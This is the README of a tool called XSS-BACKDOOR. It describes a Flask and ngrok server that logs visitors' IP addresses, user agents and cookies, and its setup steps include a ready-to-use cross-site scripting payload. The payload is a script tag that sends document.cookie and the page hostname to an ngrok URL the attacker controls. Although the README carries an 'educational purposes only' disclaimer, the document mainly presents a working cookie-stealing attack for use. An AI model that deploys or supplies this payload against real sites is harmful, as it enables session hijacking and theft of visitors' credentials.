# XSS-BACKDOOR

## Overview
XSS-BACKDOOR is a Flask-based web server that uses `ngrok` to expose a local server to the internet. It collects visitor information, including their user agent details, cookies, and IP address, and logs them in the console.

## Features
- Uses `Flask` to handle web requests.
- Uses `ngrok` to make the server accessible online.
- Parses user-agent data to identify device type, operating system, and browser.
- Captures and logs client IP address and cookies.
- Injects a JavaScript payload to capture cookies from visitors.
- Displays information in a formatted and colorized console output.

## Requirements
Ensure you have the following dependencies installed:

```bash
pip install flask pyngrok colorama user-agents
```

## Setup and Usage
1. Clone this repository:
   ```bash
   git clone https://github.com/yourusername/trap-backdoor.git
   cd trap-backdoor
   ```
2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
3. Run the script:
   ```bash
   python main.py
   ```
4. The script will generate an `ngrok` URL, which can be used to collect visitor information.
5. Payload URL:
   ```html
   <script>var i=new Image;i.src="NGROK_URL/?" + document.cookie + "&host=" + document.location.hostname;</script>
   ```
   Replace `NGROK_URL` with the actual `ngrok` link printed in the console.

## Disclaimer
This project is for educational purposes only. Unauthorized use of this software to collect sensitive information without consent is illegal and unethical. The author is not responsible for any misuse of this tool.

## License
MIT License. See [LICENSE](LICENSE) for more details.

